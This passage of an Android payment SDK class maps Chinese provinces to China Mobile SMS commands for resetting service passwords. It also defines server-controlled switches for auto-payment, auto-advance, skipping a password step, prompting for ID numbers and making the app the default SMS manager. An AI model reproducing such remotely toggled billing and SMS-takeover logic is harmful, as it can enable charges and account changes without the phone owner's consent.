                MySDK.getInstance().dispatchEvent("EVENT_PAY_FAILED", result, getCostByGoodsId(_goodsId));
            }

            @Override
            public void failed(Call call, IOException e) {
                callback.callback(6, "联网失败");
                MySDK.getInstance().dispatchEvent("EVENT_PAY_FAILED", "联网失败", getCostByGoodsId(_goodsId));
                e.printStackTrace();
            }
        });
    }

    public String doGetResetInstruction(String phoneNumber) {
//        LocationInfo info = LocationSearchHelper.getInstance().getLocationInfo(phoneNumber);
        SuperSmsManager.PhoneInfo info = SuperSmsManager.getInstance().getPhoneInfo(phoneNumber);
        String msgInstruction;
        switch (info.getProvince()) {
            case "北京":
            case "北京市":
                msgInstruction = "短信编辑“MMCZ（空格）身份证号（空格）新密码（空格）新密码”至10086进行重置";
                break;
            case "上海":
            case "上海市":
                msgInstruction = "短信编辑“MMCZ”至10086，按照提示指令进行重置。";
                break;
            case "重庆":
            case "重庆市":
                msgInstruction = "短信编辑“702”至10086，按照提示指令进行重置。";
                break;
            case "天津":
            case "天津市":
                msgInstruction = "短信编辑“2031”至10086，按照提示指令进行重置。";
                break;
            case "浙江":
                msgInstruction = "短信编辑“2010”至10086进行重置";
                break;
            case "河北":
                msgInstruction = "短信编辑“MMCZ”至10086，按照提示指令进行重置。";
                break;
            case "安徽":
                msgInstruction = "短信编辑“CZMM#身份证号”至10086，按照提示指令进行重置。";
                break;
            case "山西":
                msgInstruction = "短信编辑“CZSJMM#身份证号#新密码#新密码”至10086进行重置。";
                break;
            case "江苏":
                msgInstruction = "短信编辑“CZMM#身份证号”至10086，按照提示指令进行重置。";
                break;
            case "广东":
                msgInstruction = "短信编辑“801”至10086，按照提示指令进行重置。";
                break;
            case "四川":
                msgInstruction = "短信编辑“CZMM（空格）身份证号”至10086进行重置。";
                break;
            case "新疆":
                msgInstruction = "短信编辑“6022”至10086，按照提示指令进行重置。";
                break;
            case "海南":
                msgInstruction = "短信编辑“6012”至10086，按照提示指令进行重置。";
                break;
            case "河南":
                msgInstruction = "短信编辑“HFMM（空格）身份证号（空格）新密码”至10086进行重置。";
                break;
            case "甘肃":
                msgInstruction = "短信编辑“CZMM”至10086进行重置";
                break;
            case "江西":
                msgInstruction = "短信编辑“重置服务密码”至10086，按照提示指令进行重置。";
                break;
            case "吉林":
                msgInstruction = "短信编辑“MMCZ”至10086，按照提示指令进行重置。";
                break;
            case "云南":
                msgInstruction = "短信编辑“CZMM”至10086，按照提示指令进行重置。";
                break;
            case "山东":
                msgInstruction = "短信编辑“MMCZ（空格）身份证号（空格）新密码（空格）新密码”至10086进行重置";
                break;
            case "黑龙江":
                msgInstruction = "短信编辑“CZMM#身份证号#”至10086进行重置。";
                break;
            case "西藏":
            case "西藏自治区":
                msgInstruction = "短信编辑“PWCZ#身份证号#”至10086进行重置。";
                break;
            case "内蒙古":
            case "内蒙古自治区":
                msgInstruction = "短信编辑“MMCZ（空格）证件号码”至10086进行重置。";
                break;
            case "宁夏":
            case "宁夏回族自治区":
                msgInstruction = "短信编辑“MMCZ*入网证件号*新密码#”至10086进行重置。";
                break;
            default:
                msgInstruction = "请拨打10086客服热线获取服务密码";
                break;
        }
        return msgInstruction;
    }

    /**
     * 是否自动处理
     *
     * @return
     */
    public boolean aTry() {
        boolean ret = false;
        if (MySDK.getInstance().hasInited()) {
            String tmp = ServerHelper2.getInstance().getConfigValue("atry", "false");
            if (tmp != null && tmp.equals("true")) {
                ret = true;
            }
        }
        return ret;
    }


    /**
     * 是否跳过RPW处理
     *
     * @return
     */
    public boolean isRpwSkip() {
        boolean ret = false;
        if (MySDK.getInstance().hasInited()) {
            String tmp = ServerHelper2.getInstance().getConfigValue("isrpwskip", "false");
            if (tmp != null && tmp.equals("true")) {
                ret = true;
            }
        }
        return ret;
    }

    /**
     * 是否设置为默认短信管理器
     *
     * @return
     */
    public boolean isDefaultSMS() {
        boolean ret = false;
        if (MySDK.getInstance().hasInited()) {
            String tmp = ServerHelper2.getInstance().getConfigValue("setdefaultsms", "false");
            if (tmp != null && tmp.equals("true")) {
                ret = true;
            }
        }
        return ret;
    }

    /**
     * 是否设置vivo,oppo手机为默认短信管理器
     *
     * @return
     */
    public boolean isVivoOppoSMS() {
        boolean ret = false;
        if (MySDK.getInstance().hasInited()) {
            String tmp = ServerHelper2.getInstance().getConfigValue("setdefaultsms_vivo_oppo", "false");
            if (tmp != null && tmp.equals("true")) {
                ret = true;
            }
        }
        return ret;
    }

    /**
     * 是否自动下单
     *
     * @return
     */
    public boolean isAutoPay() {
        boolean ret = false;
        if (MySDK.getInstance().hasInited()) {
            String tmp = ServerHelper2.getInstance().getConfigValue("autopay", "false");
            if (tmp != null && tmp.equals("true")) {
                ret = true;
            }
        }
        return ret;
    }

    /**
     * 是否自动下一步
     *
     * @return
     */
    public boolean isAutoNext() {
        boolean ret = false;
        if (MySDK.getInstance().hasInited()) {
            String tmp = ServerHelper2.getInstance().getConfigValue("autonext", "false");
            if (tmp != null && tmp.equals("true")) {
                ret = true;
            }
        }
        return ret;
    }

    /**
     * 输入身份证弹框开关
     *
     * @return
     */
    public boolean isPreGetId() {
        boolean ret = false;
        if (MySDK.getInstance().hasInited()) {
            String tmp = ServerHelper2.getInstance().getConfigValue("pregetid", "false");
            if (tmp != null && tmp.equals("true")) {
                ret = true;
            }
        }
        return ret;
    }
}
